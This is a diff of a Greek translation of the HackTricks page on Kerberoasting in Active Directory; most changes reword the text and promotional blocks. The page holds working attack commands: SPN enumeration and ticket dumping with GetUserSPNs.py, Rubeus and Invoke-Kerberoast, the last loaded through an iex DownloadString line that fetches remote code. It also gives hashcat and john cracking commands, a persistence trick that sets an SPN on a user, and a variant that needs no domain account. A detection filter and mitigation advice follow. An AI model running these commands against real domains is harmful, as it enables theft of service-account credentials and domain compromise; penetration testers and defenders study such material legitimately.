@@ -3,43 +3,44 @@
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
+Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας.\
 Αποκτήστε πρόσβαση σήμερα:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
+{% hint style="success" %}
+Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-Άλλοι τρόποι υποστήριξης του HackTricks:
-
-* Αν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## Kerberoast
 
-Η διαδικασία Kerberoasting επικεντρώνεται στην απόκτηση **TGS εισιτηρίων**, ειδικότερα αυτών που σχετίζονται με υπηρεσίες που λειτουργούν υπό **λογαριασμούς χρηστών** στο **Active Directory (AD)**, εξαιρώντας τους **λογαριασμούς υπολογιστών**. Η κρυπτογράφηση αυτών των εισιτηρίων χρησιμοποιεί κλειδιά που προέρχονται από **κωδικούς πρόσβασης χρηστών**, επιτρέποντας τη δυνατότητα **αποκρυπτογράφησης διαπιστευτήριων εκτός σύνδεσης**. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσία υποδεικνύεται από τη μη κενή ιδιότητα **"ServicePrincipalName"**.
+Το Kerberoasting επικεντρώνεται στην απόκτηση **TGS tickets**, συγκεκριμένα αυτών που σχετίζονται με υπηρεσίες που λειτουργούν υπό **λογαριασμούς χρηστών** στο **Active Directory (AD)**, εξαιρώντας τους **λογαριασμούς υπολογιστών**. Η κρυπτογράφηση αυτών των εισιτηρίων χρησιμοποιεί κλειδιά που προέρχονται από **κωδικούς πρόσβασης χρηστών**, επιτρέποντας την πιθανότητα **offline credential cracking**. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσία υποδεικνύεται από μια μη κενή ιδιότητα **"ServicePrincipalName"**.
 
-Για την εκτέλεση του **Kerberoasting**, είναι απαραίτητος ένας λογαριασμός τομέα που μπορεί να ζητήσει **TGS εισιτήρια**· ωστόσο, αυτή η διαδικασία δεν απαιτεί **ειδικά δικαιώματα**, καθιστώντας την προσβάσιμη σε οποιονδήποτε με **έγκυρα διαπιστευτήρια τομέα**.
+Για την εκτέλεση του **Kerberoasting**, είναι απαραίτητος ένας λογαριασμός τομέα ικανός να ζητήσει **TGS tickets**. Ωστόσο, αυτή η διαδικασία δεν απαιτεί **ειδικά προνόμια**, καθιστώντας την προσβάσιμη σε οποιονδήποτε έχει **έγκυρα διαπιστευτήρια τομέα**.
 
-### Κύρια Σημεία:
+### Σημαντικά Σημεία:
 
-* Το **Kerberoasting** στοχεύει σε **TGS εισιτήρια** για **υπηρεσίες λογαριασμών χρηστών** εντός του **AD**.
-* Τα εισιτήρια που κρυπτογραφούνται με κλειδιά από **κωδικούς πρόσβασης χρηστών** μπορούν να **αποκρυπτογραφηθούν εκτός σύνδεσης**.
-* Μια υπηρεσία αναγνωρίζεται από ένα **ServicePrincipalName** που δεν είναι κενό.
-* Δεν απαιτούνται **ειδικά δικαιώματα**, απλώς **έγκυρα διαπιστευτήρια τομέα**.
+* Το **Kerberoasting** στοχεύει σε **TGS tickets** για **υπηρεσίες λογαριασμού χρηστών** εντός του **AD**.
+* Τα εισιτήρια που κρυπτογραφούνται με κλειδιά από **κωδικούς πρόσβασης χρηστών** μπορούν να **σπαστούν offline**.
+* Μια υπηρεσία αναγνωρίζεται από μια **ServicePrincipalName** που δεν είναι κενή.
+* **Δεν απαιτούνται ειδικά προνόμια**, μόνο **έγκυρα διαπιστευτήρια τομέα**.
 
 ### **Επίθεση**
 
 {% hint style="warning" %}
-Τα **εργαλεία Kerberoasting** συνήθως ζητούν **`κρυπτογράφηση RC4`** κατά την εκτέλεση της επίθεσης και την έναρξη αιτημάτων TGS-REQ. Αυτό συμβαίνει επειδή το **RC4 είναι** [**ασθενέστερο**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) και ευκολότερο να αποκρυπτογραφηθεί εκτός σύνδεσης χρησιμοποιώντας εργαλεία όπως το Hashcat από άλλους αλγόριθμους κρυπτογράφησης όπως το AES-128 και το AES-256.\
-Οι κατακερματισμοί RC4 (τύπος 23) ξεκινούν με **`$krb5tgs$23$*`** ενώ οι AES-256 (τύπος 18) ξεκινούν με **`$krb5tgs$18$*`**.
+Τα **εργαλεία Kerberoasting** ζητούν συνήθως **`RC4 encryption`** κατά την εκτέλεση της επίθεσης και την εκκίνηση αιτημάτων TGS-REQ. Αυτό συμβαίνει επειδή το **RC4 είναι** [**ασθενέστερο**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) και πιο εύκολο να σπάσει offline χρησιμοποιώντας εργαλεία όπως το Hashcat από άλλους αλγόριθμους κρυπτογράφησης όπως το AES-128 και το AES-256.\
+Οι κατακερματισμοί RC4 (τύπος 23) αρχίζουν με **`$krb5tgs$23$*`** ενώ οι AES-256 (τύπος 18) αρχίζουν με **`$krb5tgs$18$*`**.` 
 {% endhint %}
 
 #### **Linux**
@@ -53,21 +54,21 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Εργαλεία με πολλαπλά χαρακτηριστικά συμπεριλαμβανομένης μιας λίστας με χρήστες που μπορούν να υποστούν Kerberoast.
+Εργαλεία πολλαπλών χαρακτηριστικών που περιλαμβάνουν μια εξαγωγή χρηστών που είναι επιλέξιμοι για kerberoast:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
 #### Windows
 
-* **Απαρίθμηση χρηστών που μπορούν να υποστούν Kerberoast**
+* **Καταμέτρηση χρηστών που μπορούν να υποστούν Kerberoast**
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-* **Τεχνική 1: Ζητήστε TGS και ανακτήστε το από τη μνήμη**
+* **Τεχνική 1: Ζητήστε TGS και εξάγετε το από τη μνήμη**
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -104,74 +105,74 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-Όταν ζητείται ένα TGS, δημιουργείται το γεγονός του Windows `4769 - Ζητήθηκε ένα εισιτήριο υπηρεσίας Kerberos`.
+Όταν ζητείται ένα TGS, δημιουργείται το Windows event `4769 - A Kerberos service ticket was requested`.
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) για να δημιουργήσετε εύκολα και **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας **πιο προηγμένης** κοινότητας.\
+Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) για να δημιουργήσετε και να ** αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας.\
 Αποκτήστε πρόσβαση σήμερα:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
-### Σπάσιμο
+### Cracking
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Διατήρηση
+### Persistence
 
-Εάν έχετε **επαρκή δικαιώματα** πάνω σε έναν χρήστη μπορείτε να τον **κάνετε kerberoastable**:
+Αν έχετε **αρκετές άδειες** πάνω σε έναν χρήστη μπορείτε να **τον κάνετε kerberoastable**:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
 Μπορείτε να βρείτε χρήσιμα **εργαλεία** για επιθέσεις **kerberoast** εδώ: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-Αν αντιμετωπίζετε αυτό το **σφάλμα** από το Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** είναι λόγω της τοπικής ώρας σας, πρέπει να συγχρονίσετε τον υπολογιστή με τον DC. Υπάρχουν μερικές επιλογές:
+Αν βρείτε αυτό το **σφάλμα** από το Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** είναι λόγω της τοπικής σας ώρας, πρέπει να συγχρονίσετε τον υπολογιστή με το DC. Υπάρχουν μερικές επιλογές:
 
-* `ntpdate <IP του DC>` - Αποσυρμένο από το Ubuntu 16.04
-* `rdate -n <IP του DC>`
+* `ntpdate <IP of DC>` - Καταργήθηκε από το Ubuntu 16.04
+* `rdate -n <IP of DC>`
 
-### Αντιμετώπιση
+### Mitigation
 
-Η Kerberoasting μπορεί να πραγματοποιηθεί με υψηλό βαθμό αόρατης λειτουργίας αν είναι εκμεταλλεύσιμη. Για να ανιχνευθεί αυτή η δραστηριότητα, πρέπει να δοθεί προσοχή στο **Security Event ID 4769**, το οποίο υποδηλώνει ότι έχει ζητηθεί ένα εισιτήριο Kerberos. Ωστόσο, λόγω της υψηλής συχνότητας αυτού του γεγονότος, πρέπει να εφαρμοστούν συγκεκριμένα φίλτρα για να απομονωθούν ύποπτες δραστηριότητες:
+Το Kerberoasting μπορεί να διεξαχθεί με υψηλό βαθμό μυστικότητας αν είναι εκμεταλλεύσιμο. Για να ανιχνευθεί αυτή η δραστηριότητα, θα πρέπει να δοθεί προσοχή στο **Security Event ID 4769**, το οποίο υποδεικνύει ότι έχει ζητηθεί ένα Kerberos ticket. Ωστόσο, λόγω της υψηλής συχνότητας αυτού του γεγονότος, πρέπει να εφαρμοστούν συγκεκριμένα φίλτρα για να απομονωθούν οι ύποπτες δραστηριότητες:
 
-* Το όνομα υπηρεσίας δεν πρέπει να είναι **krbtgt**, καθώς αυτό είναι μια φυσιολογική αίτηση.
-* Τα ονόματα υπηρεσιών που τελειώνουν με **$** πρέπει να εξαιρεθούν για να αποφευχθεί η συμπερίληψη λογαριασμών μηχανών που χρησιμοποιούνται για υπηρεσίες.
-* Οι αιτήσεις από μηχανές πρέπει να φιλτραριστούν αποκλείοντας τα ονόματα λογαριασμών μορφοποιημένα ως **machine@domain**.
-* Πρέπει να ληφθούν υπόψη μόνο οι επιτυχείς αιτήσεις εισιτηρίων, που αναγνωρίζονται από έναν κωδικό αποτυχίας **'0x0'**.
-* **Το πιο σημαντικό**, ο τύπος κρυπτογράφησης του εισιτηρίου πρέπει να είναι **0x17**, ο οποίος χρησιμοποιείται συχνά σε επιθέσεις Kerberoasting.
+* Το όνομα υπηρεσίας δεν πρέπει να είναι **krbtgt**, καθώς αυτή είναι μια κανονική αίτηση.
+* Τα ονόματα υπηρεσιών που τελειώνουν με **$** θα πρέπει να εξαιρούνται για να αποφευχθεί η συμπερίληψη λογαριασμών μηχανών που χρησιμοποιούνται για υπηρεσίες.
+* Οι αιτήσεις από μηχανές θα πρέπει να φιλτράρονται αποκλείοντας ονόματα λογαριασμών που είναι διαμορφωμένα ως **machine@domain**.
+* Μόνο οι επιτυχείς αιτήσεις ticket θα πρέπει να θεωρούνται, αναγνωριζόμενες από έναν κωδικό αποτυχίας **'0x0'**.
+* **Το πιο σημαντικό**, ο τύπος κρυπτογράφησης του ticket θα πρέπει να είναι **0x17**, ο οποίος χρησιμοποιείται συχνά σε επιθέσεις Kerberoasting.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-Για να μειώσετε τον κίνδυνο του Kerberoasting:
+Για να μετριαστεί ο κίνδυνος του Kerberoasting:
 
-* Βεβαιωθείτε ότι **οι κωδικοί πρόσβασης των λογαριασμών υπηρεσιών είναι δύσκολοι να μαντευτούν**, συστήνοντας μήκος πάνω από **25 χαρακτήρες**.
-* Χρησιμοποιήστε **Διαχειριζόμενους Λογαριασμούς Υπηρεσιών**, οι οποίοι προσφέρουν οφέλη όπως **αυτόματες αλλαγές κωδικών πρόσβασης** και **αναθεωρημένη Διαχείριση Ονομάτων Υπηρεσιών Κύριου (SPN)**, ενισχύοντας την ασφάλεια ενάντια σε τέτοιου είδους επιθέσεις.
+* Διασφαλίστε ότι οι **Κωδικοί Πρόσβασης Λογαριασμών Υπηρεσίας είναι δύσκολοι να μαντευτούν**, προτείνοντας μήκος μεγαλύτερο από **25 χαρακτήρες**.
+* Χρησιμοποιήστε **Διαχειριζόμενους Λογαριασμούς Υπηρεσίας**, οι οποίοι προσφέρουν πλεονεκτήματα όπως **αυτόματες αλλαγές κωδικών πρόσβασης** και **διαχείριση Εξουσιοδοτημένων Ονομάτων Υπηρεσίας (SPN)**, ενισχύοντας την ασφάλεια κατά τέτοιων επιθέσεων.
 
 Με την εφαρμογή αυτών των μέτρων, οι οργανισμοί μπορούν να μειώσουν σημαντικά τον κίνδυνο που σχετίζεται με το Kerberoasting.
 
 ## Kerberoast χωρίς λογαριασμό τομέα
 
-Τον **Σεπτέμβριο του 2022**, ένας νέος τρόπος εκμετάλλευσης ενός συστήματος φέρθηκε στο φως από έναν ερευνητή με το όνομα Charlie Clark, κοινοποιημένος μέσω της πλατφόρμας του [exploit.ph](https://exploit.ph/). Αυτή η μέθοδος επιτρέπει την απόκτηση **Εισιτηρίων Υπηρεσιών (ST)** μέσω ενός αιτήματος **KRB\_AS\_REQ**, το οποίο εντυπωσιακά δεν απαιτεί έλεγχο επί κάποιου λογαριασμού Active Directory. Βασικά, αν ένας αρχέγονος είναι ρυθμισμένος με τέτοιο τρόπο ώστε να μην απαιτεί προ-πιστοποίηση - ένα σενάριο παρόμοιο με αυτό που είναι γνωστό στον κυβερνοχώρο ως επίθεση **AS-REP Roasting** - αυτό το χαρακτηριστικό μπορεί να αξιοποιηθεί για τη χειραγώγηση της διαδικασίας αιτήματος. Συγκεκριμένα, με την τροποποίηση του χαρακτηριστικού **sname** μέσα στο σώμα του αιτήματος, το σύστημα απατείται να εκδώσει ένα **ST** αντί για το κανονικό κρυπτογραφημένο Εισιτήριο Χορήγησης Εισιτηρίων (TGT).
+Το **Σεπτέμβριο του 2022**, μια νέα μέθοδος εκμετάλλευσης ενός συστήματος αποκαλύφθηκε από έναν ερευνητή ονόματι Charlie Clark, που μοιράστηκε μέσω της πλατφόρμας του [exploit.ph](https://exploit.ph/). Αυτή η μέθοδος επιτρέπει την απόκτηση **Εισιτηρίων Υπηρεσίας (ST)** μέσω ενός αιτήματος **KRB\_AS\_REQ**, το οποίο αξιοσημείωτα δεν απαιτεί έλεγχο οποιουδήποτε λογαριασμού Active Directory. Ουσιαστικά, αν ένας κύριος έχει ρυθμιστεί με τέτοιο τρόπο ώστε να μην απαιτεί προ-εξουσιοδότηση—μια κατάσταση παρόμοια με αυτή που είναι γνωστή στον τομέα της κυβερνοασφάλειας ως **AS-REP Roasting attack**—αυτή η χαρακτηριστική μπορεί να εκμεταλλευτεί για να παραποιήσει τη διαδικασία αιτήματος. Συγκεκριμένα, αλλάζοντας το χαρακτηριστικό **sname** μέσα στο σώμα του αιτήματος, το σύστημα παραπλανάται να εκδώσει ένα **ST** αντί για το τυπικό κρυπτογραφημένο Εισιτήριο Χορήγησης Εισιτηρίου (TGT).
 
-Η τεχνική εξηγείται πλήρως σε αυτό το άρθρο: [Ανάρτηση ιστολογίου Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+Η τεχνική εξηγείται πλήρως σε αυτό το άρθρο: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 {% hint style="warning" %}
-Πρέπει να παρέχετε μια λίστα χρηστών επειδή δεν έχουμε έγκυρο λογαριασμό για να ερωτήσουμε το LDAP χρησιμοποιώντας αυτήν την τεχνική.
+Πρέπει να παρέχετε μια λίστα χρηστών γιατί δεν έχουμε έγκυρο λογαριασμό για να κάνουμε ερώτημα στο LDAP χρησιμοποιώντας αυτή την τεχνική.
 {% endhint %}
 
 #### Linux
 
-* [impacket/GetUserSPNs.py από το PR #1413](https://github.com/fortra/impacket/pull/1413):
+* [impacket/GetUserSPNs.py από PR #1413](https://github.com/fortra/impacket/pull/1413):
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
 #### Windows
 
-* [GhostPack/Rubeus από το PR #139](https://github.com/GhostPack/Rubeus/pull/139):
+* [GhostPack/Rubeus από PR #139](https://github.com/GhostPack/Rubeus/pull/139):
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
@@ -181,24 +182,25 @@ Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"d
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 
+{% hint style="success" %}
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-Άλλοι τρόποι υποστήριξης του HackTricks:
-
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο **προηγμένα εργαλεία** της κοινότητας.\
+Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** που υποστηρίζονται από τα **πιο προηγμένα** εργαλεία της κοινότητας στον κόσμο.\
 Αποκτήστε πρόσβαση σήμερα:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
